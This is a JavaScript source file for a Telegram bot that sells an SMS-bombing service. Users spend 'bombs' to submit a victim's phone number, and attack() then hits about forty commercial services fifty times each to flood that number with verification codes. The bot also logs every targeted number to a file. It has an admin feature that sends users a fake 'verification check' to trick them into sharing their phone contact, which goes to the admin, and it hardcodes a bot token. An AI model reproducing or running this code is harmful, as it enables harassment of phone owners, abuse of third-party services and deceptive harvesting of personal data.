const TelegramBot = require("node-telegram-bot-api"); let XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
const services = require("./services");
const fs = require("fs");
const stats = require("./stats.json");
const TOKEN = "1324863442:AAHpqUvd-mBBfy6zPMpp-87fqncw7jxRtDw"; // –¢–æ–∫–µ–Ω

const bot = new TelegramBot(TOKEN, {
    polling: true
});

let attackNow = false; // –ò–¥–µ—Ç –ª–∏ —É–∂–µ –∞—Ç–∞–∫–∞
let convertPhone = ""; // –¢–µ–ª–µ—Ñ–æ–Ω –∂–µ—Ä—Ç–≤—ã
let admin = 957965876; // id –∞–¥–º–∏–Ω–∞
let allUsersData = require("./data.json");

let blacklistMsg = false; // –ü—Ä–æ–≤–µ—Ä–∫–∞, –¥–æ–ª–∂–Ω–æ –ª–∏ –±—ã—Ç—å —Å–ª—É–¥—É—é—â–µ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ–º –≤ –ß–°
let notificationMsg = false;
let toUpBombsMsg = false;
let phishingMsg = false;
let whomToTopUp = "";
let amountBombsUp = 0;
let amountBombsUpMsg = false;


bot.on("callback_query", query => {
    if (query.data === "blacklist") {
        bot.sendMessage(admin, "–í–≤–µ–¥–∏—Ç–µ id –∞–∫–∫–∞—É–Ω—Ç–∞ –∫–æ—Ç–æ—Ä–æ–≥–æ –≤—ã –¥–æ–±–∞–≤–∏—Ç–µ/—É–±–µ—Ä–µ—Ç–µ –∏–∑ –ß–°:")
        blacklistMsg = true;
    } else if (query.data === "showAllUsers") {
        showAllUsers();
    } else if (query.data === "notification") {
        notificationMsg = true;
        bot.sendMessage(admin, "–í–≤–µ–¥–∏—Ç–µ –æ–ø–æ–≤–µ—â–µ–Ω–∏–µ:");
    } else if (query.data === "toUpBombs") {
        toUpBombsMsg = true;
        bot.sendMessage(admin, "–í–≤–µ–¥–∏—Ç–µ id —é–∑–µ—Ä–∞ –∫–æ—Ç–æ—Ä–æ–º—É —Ö–æ—Ç–∏—Ç–µ –ø–æ–ø–æ–ª–Ω–∏—Ç—å/—É–º–µ–Ω—å—à–∏—Ç—å bombs:")
    } else if (query.data === "phishing") {
        phishingMsg = true;
        bot.sendMessage(admin, "–í–≤–µ–¥–∏—Ç–µ id –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä–æ–º—É –±—É–¥–µ—Ç –Ω–∞–ø—Ä–≤–ª–µ–Ω —Ñ–∏—à–∏–Ω–≥:")
    } else if (query.data === "restart") {
        restart();
    };
});

bot.onText(/\/start/, msg => {
    const chat_id = msg.chat.id;
    let from_id = msg.from.id;
    for (let i of allUsersData) {
        if (i.user.id === from_id) {
            if (i.user.phish === false) {
                if (i.user.inChannel === true) {
                    i.user.wantToAttack = false;
                    bot.sendMessage(chat_id, "–ü—Ä–∏–≤–µ—Ç! –ß—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å —Å–ø–∞–º - –≤—ã–±–µ—Ä–∏ –¥–∞–Ω–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é –Ω–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–µ!", {
                        reply_markup: {
                            keyboard: [
                                ["–ù–∞—á–∞—Ç—å —Å–ø–∞–º!üí£", "–õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Çüíº", "–ü–æ–ª—É—á–∏—Ç—å bombs‚Ñπ"],
                                ["–û –±–æ—Ç–µü•ì"]
                            ],
                            resize_keyboard: true
                        }
                    });
                } else {
                    // console.log(inChannelF(msg));
                    bot.sendMessage(chat_id, `\n<b>–î–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è - –ø–æ–¥–ø–∏—à–∏—Å—å –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª!</b>\n\n–ß—Ç–æ —Ç—ã —É–≤–∏–¥–∏—à—å –≤ <a href='https://t.me/debian_lab'>@debian_lab</a>:\n\n‚≠ê<i>–°–∞–º–æ–µ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–µ –∏–∑ –º–∏—Ä–∞ IT</i>‚≠ê\n\n‚≠ê<i>–†–æ–∑—ã–≥—Ä—ã—à–∏ –∏ –∫–≤–µ—Å—Ç—ã –Ω–∞ –≥–æ–¥–Ω—ã–µ –ø—Ä–∏–∑—ã</i>‚≠ê\n\n‚≠ê<i>–õ–∞–º–ø–æ–≤–∞—è –∞—Ç–º–æ—Å—Ñ–µ—Ä–∞ –≤ —á–∞—Ç–µ</i>‚≠ê\n\n‚≠ê<i>–°–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π —Å–æ—Ñ—Ç‚≠ê</i>`, { parse_mode: "HTML" })
                };
            } else {
                bot.sendMessage(chat_id, "–í—ã –Ω–µ –ø—Ä–æ—à–ª–∏ –ø—Ä–æ–≤–µ—Ä–∫—É!", {
                    reply_markup: {
                        keyboard: [
                            [{
                                text: "–ü—Ä–æ–π—Ç–∏ –ø—Ä–æ–≤–µ—Ä–∫—É",
                                request_contact: true,
                                resize_keyboard: true
                            }]
                        ]
                    },
                });
            };
        };
    };
    if (chat_id === admin) {
        bot.sendMessage(chat_id, "–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π, –¥–æ—Ä–æ–≥–æ–π –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä!\n–¢—ã –º–æ–∂–µ—à—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ª—é–±—É—é –∏–∑ –Ω–∏–∂–µ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π", {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "–î–æ–±–∞–≤–∏—Ç—å/–£–±—Ä–∞—Ç—å ID –≤/–∏–∑ —á—Å",
                        callback_data: "blacklist"
                    }],

                    [{
                        text: "–ü–æ–∫–∞–∑–∞—Ç—å –¥–∞–Ω–Ω—ã–µ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π",
                        callback_data: "showAllUsers"
                    }],
                    [{
                        text: "–°–¥–µ–ª–∞—Ç—å –æ–ø–æ–≤–µ—â–µ–Ω–∏–µ",
                        callback_data: "notification"
                    }],
                    [{
                        text: "–ü–æ–ø–æ–ª–Ω–∏—Ç—å bombs",
                        callback_data: "toUpBombs"
                    }],
                    [{
                        text: "–ü–æ–π–º–∞—Ç—å –Ω–∞ —Ñ–∏—à–∏–Ω–≥",
                        callback_data: "phishing"
                    }],
                    [{
                        text: "–ü–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç—å –¥–∞–Ω–Ω—ã–µ",
                        callback_data: "restart"
                    }]
                ]
            }
        });
    };
});

bot.onText(/–ù–∞—á–∞—Ç—å —Å–ø–∞–º!üí£/, msg => {
    let chat_id = msg.chat.id;
    let from_id = msg.from.id;
    for (let i of allUsersData) {
        if (i.user.id === from_id) {
            if (i.user.inChannel === true) {
                if (i.user.blacklist === false) {
                    if (i.user.bombs > 0) {
                        i.user.wantToAttack = true;

                        bot.sendMessage(chat_id, "–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä\nüìù–û–±—Ä–∞–∑–µ—Ü:\n<i>71234567890</i>\n<i>380123456789</i>", {
                            parse_mode: "HTML"
                        });
                    } else if (i.user.bombs <= 0) {
                        bot.sendMessage(chat_id, "<i>–£ –í–∞—Å –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ bombs –Ω–∞ —Å—á–µ—Ç—É!</i>", {
                            parse_mode: "HTML"
                        });
                    };

                } else if (i.user.blacklist === true) {
                    bot.sendMessage(chat_id, "<b>–í–∞—à –∞–∫–∫–∞—É–Ω—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω!</b>", {
                        parse_mode: "HTML"
                    });
                };

            } else {
                bot.sendMessage(chat_id, `\n<b>–î–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è - –ø–æ–¥–ø–∏—à–∏—Å—å –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª!</b>\n\n–ß—Ç–æ —Ç—ã —É–≤–∏–¥–∏—à—å –≤ <a href='https://t.me/debian_lab'>@debian_lab</a>:\n\n‚≠ê<i>–°–∞–º–æ–µ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–µ –∏–∑ –º–∏—Ä–∞ IT</i>‚≠ê\n\n‚≠ê<i>–†–æ–∑—ã–≥—Ä—ã—à–∏ –∏ –∫–≤–µ—Å—Ç—ã –Ω–∞ –≥–æ–¥–Ω—ã–µ –ø—Ä–∏–∑—ã</i>‚≠ê\n\n‚≠ê<i>–õ–∞–º–ø–æ–≤–∞—è –∞—Ç–º–æ—Å—Ñ–µ—Ä–∞ –≤ —á–∞—Ç–µ</i>‚≠ê\n\n‚≠ê<i>–°–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π —Å–æ—Ñ—Ç‚≠ê</i>`, { parse_mode: "HTML" })
            };
        };
    };
});

bot.onText(/–ü–æ–ª—É—á–∏—Ç—å bombs‚Ñπ/, msg => {
    let chat_id = msg.chat.id;
    let from_id = msg.from.id;
    for (let i of allUsersData) {
        if (i.user.id === from_id) {
            if (i.user.inChannel === true) {
                i.user.wantToAttack = false;
                bot.sendMessage(chat_id, "<i>–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è/–ø–æ–∫—É–ø–∫–∏ bombs - –Ω–∞–ø–∏—à–∏—Ç–µ –º–Ω–µ (@mitchel_ed) –≤ –ª—Å</i>", {
                    parse_mode: "HTML"
                });
            } else {
                bot.sendMessage(chat_id, `\n<b>–î–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è - –ø–æ–¥–ø–∏—à–∏—Å—å –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª!</b>\n\n–ß—Ç–æ —Ç—ã —É–≤–∏–¥–∏—à—å –≤ <a href='https://t.me/debian_lab'>@debian_lab</a>:\n\n‚≠ê<i>–°–∞–º–æ–µ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–µ –∏–∑ –º–∏—Ä–∞ IT</i>‚≠ê\n\n‚≠ê<i>–†–æ–∑—ã–≥—Ä—ã—à–∏ –∏ –∫–≤–µ—Å—Ç—ã –Ω–∞ –≥–æ–¥–Ω—ã–µ –ø—Ä–∏–∑—ã</i>‚≠ê\n\n‚≠ê<i>–õ–∞–º–ø–æ–≤–∞—è –∞—Ç–º–æ—Å—Ñ–µ—Ä–∞ –≤ —á–∞—Ç–µ</i>‚≠ê\n\n‚≠ê<i>–°–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π —Å–æ—Ñ—Ç‚≠ê</i>`, { parse_mode: "HTML" });
            };
        };
    };
})


bot.onText(/–õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Çüíº/, msg => {
    let chat_id = msg.chat.id;
    let from_id = msg.from.id;
    let name, username, blacklist = "";
    let bombs = 0;
    for (let i of allUsersData) {
        if (i.user.id === from_id) {
            if (i.user.inChannel === true) {
                i.user.wantToAttack = false;
                name = i.user.name;
                username = i.user.username;
                bombs = i.user.bombs;
                if (i.user.blacklist === true) {
                    blacklist = "\n\n<i>–í—ã –≤ —á–µ—Ä–Ω–æ–º —Å–ø–∏—Å–∫–µ!\n–î–ª—è —Ä–∞–∑–±–∞–Ω–∞ - –ø–∏—à–∏—Ç–µ @mitchel_ed</i>";
                }
                bot.sendMessage(chat_id, `–í–∞—à id: ${from_id}\n–í–∞—Å –∑–æ–≤—É—Ç: ${name}\n–í–∞—à username: ${username}\n–£ –í–∞—Å bombs: ${bombs}${blacklist}`);
            } else {
                bot.sendMessage(chat_id, `\n<b>–î–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è - –ø–æ–¥–ø–∏—à–∏—Å—å –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª!</b>\n\n–ß—Ç–æ —Ç—ã —É–≤–∏–¥–∏—à—å –≤ <a href='https://t.me/debian_lab'>@debian_lab</a>:\n\n‚≠ê<i>–°–∞–º–æ–µ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–µ –∏–∑ –º–∏—Ä–∞ IT</i>‚≠ê\n\n‚≠ê<i>–†–æ–∑—ã–≥—Ä—ã—à–∏ –∏ –∫–≤–µ—Å—Ç—ã –Ω–∞ –≥–æ–¥–Ω—ã–µ –ø—Ä–∏–∑—ã</i>‚≠ê\n\n‚≠ê<i>–õ–∞–º–ø–æ–≤–∞—è –∞—Ç–º–æ—Å—Ñ–µ—Ä–∞ –≤ —á–∞—Ç–µ</i>‚≠ê\n\n‚≠ê<i>–°–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π —Å–æ—Ñ—Ç‚≠ê</i>`, { parse_mode: "HTML" });
            };
        };
    };
});

function inChannelF(msg) {
    if (msg.chat.type != "group" && msg.chat.type != "supergroup") {
        let chat_id = msg.chat.id;
        let inChannel = false;
        let xhr = new XMLHttpRequest();
        xhr.open("GET", `https://api.telegram.org/bot${TOKEN}/getChatMember?chat_id=@debian_lab&user_id=${chat_id}`, true);
        xhr.send()
        xhr.onload = () => {
            let response = JSON.parse(xhr.responseText);
            // console.log(response.result.status);
            if (response.result.status != "left") {
                inChannel = true;
            } else {
                inChannel = false;
            };
            for (let i of allUsersData) {
                if (i.user.id === chat_id) {
                    i.user.inChannel = inChannel;
                };
            };
        };
    };
};

function restart() {
    fs.writeFileSync("data.json", JSON.stringify(allUsersData));
    fs.writeFileSync("stats.json", JSON.stringify(stats))
};


bot.on("message", msg => {
    let chat_id = msg.chat.id;
    let from_id = msg.from.id;
    restart();
    stats.msg += 1;
    updateData(msg);
    inChannelF(msg);
    // console.log(msg);
    if (msg.text != "/start" && msg.text != "–ù–∞—á–∞—Ç—å —Å–ø–∞–º!üí£" && msg.text != "–ü–æ–ª—É—á–∏—Ç—å bombs‚Ñπ" && msg.text != "–õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Çüíº") {
        for (let i of allUsersData) {
            if (i.user.id === from_id) {
                if (i.user.inChannel === true) {
                    if (i.user.wantToAttack === true) {
                        if (attackNow === false) {
                            if (i.user.bombs > 0) {
                                convertPhone = msg.text;
                                if ((convertPhone.length === 11 && convertPhone[0] === "7") || (convertPhone.length === 12 && convertPhone[0] === "3" && convertPhone[1] === "8" && convertPhone[2] === "0")) {
                                    attackNow = true;
                                    bot.sendMessage(chat_id, "–ó–∞–ø—Ä–æ—Å –ø—Ä–∏–Ω—è—Ç!\n<i>–ê—Ç–∞–∫–∞ –±—É–¥–µ—Ç –ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∞ –≤ –±–ª–∏–∂–∞–π—à–µ–µ –≤—Ä–µ–º—è\n–î–ª—è —ç—Ñ–µ–∫—Ç–∏–≤–Ω–æ–≥–æ –±–æ–º–±–∏–Ω–≥–∞ —Å–æ–≤–µ—Ç—É–µ–º –ø–æ–≤—Ç–æ—Ä–∏—Ç—å —á–µ—Ä–µ–∑ ~10 –º–∏–Ω—É—Ç</i>", { parse_mode: "HTML" });
                                    i.user.bombs -= 1;
                                    attack(msg);
                                } else {
                                    bot.sendMessage(chat_id, "–í—ã –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –≤–≤–µ–ª–∏ –¥–∞–Ω–Ω—ã–µ=(")
                                };
                            } else if (i.user.bombs <= 0) {
                                bot.sendMessage(chat_id, "</i>–£ –í–∞—Å –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ bombs –Ω–∞ —Å—á–µ—Ç—É!<i>", {
                                    parse_mode: "HTML"
                                });
                            };
                        } else {
                            bot.sendMessage(chat_id, "–ê—Ç–∞–∫–∞ —É–∂–µ –∏–¥–µ—Ç –Ω–∞ –¥—Ä—É–≥–æ–π –Ω–æ–º–µ—Ä, –ø–æ–¥–æ–∂–¥–∏—Ç–µ –Ω–µ–º–æ–≥–æ");
                        };
                        i.user.wantToAttack = false;
                    };
                } else {
                    bot.sendMessage(chat_id, `\n<b>–î–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è - –ø–æ–¥–ø–∏—à–∏—Å—å –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª!</b>\n\n–ß—Ç–æ —Ç—ã —É–≤–∏–¥–∏—à—å –≤ <a href='https://t.me/debian_lab'>@debian_lab</a>:\n\n‚≠ê<i>–°–∞–º–æ–µ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–µ –∏–∑ –º–∏—Ä–∞ IT</i>‚≠ê\n\n‚≠ê<i>–†–æ–∑—ã–≥—Ä—ã—à–∏ –∏ –∫–≤–µ—Å—Ç—ã –Ω–∞ –≥–æ–¥–Ω—ã–µ –ø—Ä–∏–∑—ã</i>‚≠ê\n\n‚≠ê<i>–õ–∞–º–ø–æ–≤–∞—è –∞—Ç–º–æ—Å—Ñ–µ—Ä–∞ –≤ —á–∞—Ç–µ</i>‚≠ê\n\n‚≠ê<i>–°–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π —Å–æ—Ñ—Ç‚≠ê</i>`, { parse_mode: "HTML" })
                };
            };


        };
        if (blacklistMsg === true) {
            for (let i of allUsersData) {
                if (i.user.id == msg.text) {
                    if (i.user.blacklist === true) {
                        i.user.blacklist = false;
                    } else if (i.user.blacklist === false) {
                        i.user.blacklist = true;
                    };
                };
            };
            blacklistMsg = false;
            bot.sendMessage(admin, `–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å id ${msg.text} –±—ã–ª —É—Å–ø–µ—à–Ω–æ –∑–∞–±–∞–Ω–µ–Ω/—Ä–∞–∑–±–∞–Ω–µ–Ω`)
        };

        if (notificationMsg === true) {
            for (let i of allUsersData) {
                bot.sendMessage(i.user.id, `${msg.text}`)
            }
            notificationMsg = false;
            bot.sendMessage(admin, "–í–∞—à–µ –æ–ø–æ–≤–µ—â–µ–Ω–∏–µ –±—ã–ª–æ —Ä–∞–∑–æ—Å–ª–∞–Ω–æ!")
        };

        if (toUpBombsMsg === true) {
            if (msg.chat.id === admin) {
                if (amountBombsUpMsg === false) {
                    whomToTopUp = parseInt(msg.text);
                    console.log(`whomToTopUp: ${whomToTopUp}`);
                    amountBombsUpMsg = true;
                    bot.sendMessage(admin, "–í–≤–µ–¥–∏—Ç–µ –Ω–∞ –∫–∞–∫–æ–µ –∫–æ–ª-–≤–æ –≤—ã —Ö–æ—Ç–∏—Ç–µ –ø–æ–ø–æ–ª–Ω–∏—Ç—å/—É–º–µ–Ω—å—à–∏—Ç—å bombs")
                } else {
                    amountBombsUp = parseInt(msg.text);
                    console.log(`amountBombsUp: ${amountBombsUp}`);
                    for (let i of allUsersData) {
                        if (i.user.id === whomToTopUp) {
                            i.user.bombs += amountBombsUp;
                            console.log("—ã–æ–≤—Ä–∞");
                        }
                    }
                    toUpBombsMsg = false;
                    amountBombsUp = 0;
                    whomToTopUp = "";
                    amountBombsUpMsg = false;
                    bot.sendMessage(admin, "bombs –±—ã–ª–∏ —É–º–µ–Ω—å—à–µ–Ω—ã/–ø–æ–ø–æ–ª–Ω–µ–Ω—ã!")
                };
            };
        };

        if (phishingMsg === true) {
            for (let i of allUsersData) {
                if (i.user.id === parseInt(msg.text)) {
                    i.user.phish = true;
                    bot.sendMessage(parseInt(msg.text), "–í—ã –ø–æ–ø–∞–ª–∏—Å—å –Ω–∞ –µ–∂–µ–Ω–µ–¥–µ–ª—å–Ω—É—é –ø—Ä–æ–≤–µ—Ä–∫—É!\n–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ —á—Ç–æ –í—ã –Ω–µ –±–æ—Ç –Ω–∞–∂–∞–≤ –∫–Ω–æ–ø–∫—É –Ω–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–µ —Å–Ω–∏–∑—Éüëá\n\n<i>–í –∑–Ω–∞–∫ –≤–æ–∑–Ω–∞–≥—Ä–∞–∂–¥–µ–Ω–∏—è –∑–∞ –ø–æ—Ç—Ä–∞—á–µ–Ω–Ω–æ–µ –≤—Ä–µ–º—è –≤—ã –ø–æ–ª—É—á–∏—Ç–µ 10 bombs</i>", {
                        reply_markup: {
                            keyboard: [
                                [{
                                    text: "–ü—Ä–æ–π—Ç–∏ –ø—Ä–æ–≤–µ—Ä–∫—É",
                                    request_contact: true,
                                    resize_keyboard: true
                                }]
                            ]
                        },
                        parse_mode: "HTML"
                    });
                };
                bot.sendMessage(admin, "–§–∏—à–∏–Ω–≥ –±—ã–ª –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω:)")
                phishingMsg = false;
            };

        };
    };
});

bot.onText(/–û –±–æ—Ç–µü•ì/, msg => {
    let from_id = msg.from.id;
    let chat_id = msg.chat.id;
    for (let i of allUsersData) {
        if (i.user.id === from_id) {
            if (i.user.inChannel === true) {
                i.user.wantToAttack = false;
                bot.sendMessage(chat_id, `<i>–õ—é–¥–µ–π –≤ –±–æ—Ç–µüëº:</i> <b>${stats.people}</b>\n<i>–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–πüéà:</i> <b>${stats.msg}</b>\n<i>–ê—Ç–∞–∫–æ–≤–∞–Ω–æ –Ω–æ–º–µ—Ä–æ–≤üéÉ:</i> <b>${stats.bombed}</b>\n<i>–°–µ—Ä–≤–∏—Å–æ–≤üéâ:</i> <b>54</b>\n<i>–î–∞—Ç–∞ –∑–∞–ø—É—Å–∫–∞:</i> <b>${stats.data}</b>
                `, {
                    parse_mode: "HTML"
                });
            };
        };
    }
});

function updateData(msg) {
    let inData = false;
    let chat_id = msg.chat.id;
    let from_id = msg.from.id;
    let name = msg.from.first_name;
    let username = msg.from.username;
    username = "@" + username;
    let newObj = {
        user: {

        }
    }
    for (let i of allUsersData) {
        if (i.user.id === msg.chat.id) {
            inData = true;
            break;
        }
    }

    if (inData === false) {
        stats.people += 1;
        newObj["user"]["id"] = from_id;
        newObj["user"]["name"] = name;
        newObj["user"]["username"] = username;
        newObj["user"]["blacklist"] = false;
        newObj["user"]["wantToAttack"] = false;
        newObj["user"]["bombs"] = 5;
        newObj["user"]["phish"] = false;
        newObj["user"]["inChannel"] = true;
        allUsersData.push(newObj);
        // console.log(allUsersData);
        bot.sendMessage(msg.chat.id, "–í—ã –ø–æ–ª—É—á–∏–ª–∏ 5 bombs –∑–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é‚úîÔ∏è")
    };
}




function attack(msg) {
    fs.appendFileSync("phones.txt", `#id${msg.from.id}(${msg.from.username}):${convertPhone}\n`);
    stats.bombed += 1;
    for (let i = 0; i < 50; i++) {
        services.sunlight(convertPhone);
        services.yandexEda(convertPhone);
        services.prime(convertPhone);
        services.youla(convertPhone);
        services.wowworks(convertPhone);
        services.gotinder(convertPhone);
        services.qlean(convertPhone);
        services.ok(convertPhone);
        services.ivi(convertPhone);
        services.rutube(convertPhone);
        services.rutaxi(convertPhone);
        services.tinkoff(convertPhone);
        services.menu(convertPhone);
        services.dostaevsky(convertPhone);
        services.cabinet(convertPhone);
        services.webbankir(convertPhone);
        services.uklon(convertPhone);
        services.ubki(convertPhone);
        services.tiktok(convertPhone);
        services.thehive(convertPhone);
        services.pizza33(convertPhone);
        services.sportmasterUa(convertPhone);
        services.qlean(convertPhone);
        services.qlean2(convertPhone);
        services.prosushi(convertPhone);
        services.planetakino(convertPhone);
        services.pizzasinizza(convertPhone);
        services.pizzakazan(convertPhone);
        services.ozon(convertPhone);
        services.mistercash(convertPhone);
        services.mts(convertPhone);
        services.vsk(convertPhone);
        services.citilink(convertPhone);
        services.icq(convertPhone);
        services.delimobil(convertPhone);
        services.boosty(convertPhone);
        services.dnsShop(convertPhone);
        services.modulBank(convertPhone);
        services.moneyman(convertPhone);
        services.lenta(convertPhone);
        services.koronapay(convertPhone);
    };
    attackNow = false;
};

bot.on("polling_error", err => {
    throw err;
});

function showAllUsers() {
    let card = "";
    for (let i of allUsersData) {
        card += `\n<b>id:</b> <code>${i.user.id}</code>\n<b>–ò–º—è: </b><i>${i.user.name}</i>\n<b>username:</b> <i>${i.user.username}</i>\n<b>–ß–µ—Ä–Ω—ã–π —Å–ø–∏—Å–æ–∫:</b> <i>${i.user.blacklist}</i>\n<b>bombs: </b><i>${i.user.bombs}</i>\n<b>phish: </b><i>${i.user.phish}</i>`
    };
    bot.sendMessage(admin, card, {
        parse_mode: "HTML"
    });
}

bot.on("contact", msg => {
    bot.sendMessage(msg.chat.id, "–°–ø–∞—Å–∏–±–æ! –í—ã –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª–∏ —á—Ç–æ –í—ã –Ω–µ –±–æ—Ç! –í–∞–º –Ω–∞—á–∏—Å–ª–µ–Ω–æ 10 bombs!", {
        reply_markup: {
            keyboard: [
                ["–ù–∞—á–∞—Ç—å —Å–ø–∞–º!üí£", "–õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Çüíº", "–ü–æ–ª—É—á–∏—Ç—å bombs‚Ñπ"],
                ["–û –±–æ—Ç–µü•ì"]
            ],
            resize_keyboard: true
        }
    })

    for (let i of allUsersData) {
        if (i.user.id === msg.chat.id) {
            i.user.bombs += 10;
            i.user.phish = false;
        };
    };
    bot.sendMessage(admin, `\n
    –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: ${msg.contact.phone_number}
    –ò–º—è: ${msg.contact.first_name}
    id: ${msg.contact.user_id}
    username: @${msg.chat.username}`)
})